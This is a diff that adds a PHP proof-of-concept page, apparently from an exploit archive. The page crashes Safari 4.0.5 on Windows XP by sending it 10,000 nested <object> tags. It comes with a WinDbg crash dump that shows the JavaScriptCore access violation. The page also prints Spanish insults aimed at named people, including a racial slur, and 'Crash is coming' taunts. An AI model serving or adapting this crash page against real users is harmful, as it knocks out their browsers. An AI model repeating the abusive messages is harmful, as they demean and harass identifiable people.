@@ -1,0 +1,47 @@
+<?php
+/***************************************************************************
+[TITLE]: SAFARI APPLE 4.0.5 (object tag) (JavaScriptCore.dll) DoS (Crash) 
+[OS]: WINDOWS XP SP3
+[DOWNLOAD]: http://www.apple.com/es/safari/download/
+[AUTHOR]: 3lkt3F0k4
+[CONTACT]: 3lkt3F0k4[i_love_spam]gmail[i_love_spam]com
+
+-------------------------CRASH DUMP SNIP------------------------------------ 
+
+Executable search path is: 
+Windows XP Version 2600 (Service Pack 3) UP Free x86 compatible
+Product: WinNt, suite: SingleUserTS
+Machine Name:
+Debug session time: Sun Mar 21 23:34:38.000 2010 (GMT+1)
+System Uptime: not available
+Process Uptime: 0 days 0:01:54.000
+................................................................
+This dump file has an exception of interest stored in it.
+The stored exception information can be accessed via .ecxr.
+(d94.d98): Access violation - code c0000005 (first/second chance not available)
+eax=00000000 ebx=00000000 ecx=01417ea0 edx=0000000a esi=00011ae2 edi=7ff90240
+eip=0137b267 esp=00128c50 ebp=00000000 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for JavaScriptCore.dll - 
+JavaScriptCore!JSC::CString::~CString+0x40d7:
+0137b267 c705efbeadbb00000000 mov dword ptr ds:[0BBADBEEFh],0 ds:0023:bbadbeef=????????
+
+-------------------------CRASH DUMP SNIP------------------------------------ 
+
+***************************************************************************/
+$fuzz=str_repeat("<object>",10000);
+echo "<title>SAFARI APPLE 4.0.5 (object tag) (JavaScriptCore.dll) DoS (Crash)</title>";
+echo "<center><b><font color='#ff0000'>Wait please...Crash is coming...</font><br><br><br>";
+echo "Spanish message for my friends:<br>";
+echo "0wn3Dsss!!<br>";
+echo "TiTo MC es un negro cabron que rapea como el puto culo.<br>";
+echo "Chema Alonso a.k.a. maligno a.k.a. neo payaso MS.<br>";
+echo "Eres vergonzoso, penoso, lamo, n44b, l3l,...<br>";
+echo "Tus reflexiones son tristes y pobres, vas a comision? das pena chaval!<br>"; 
+echo "Putos focaaaas!<br><br>";
+echo "Greetz to my team: Spanishiit Team. Welcome everyone!<br>";
+echo "We'll come back fucking more people...Sure!<br><br><br>";
+echo "<hr width='80%' />";
+echo "<font color='#ff0000'>I <3 Rooted CON 2010. Next year more! (shhhhhh)</font></center>";
+echo $fuzz;
+?>
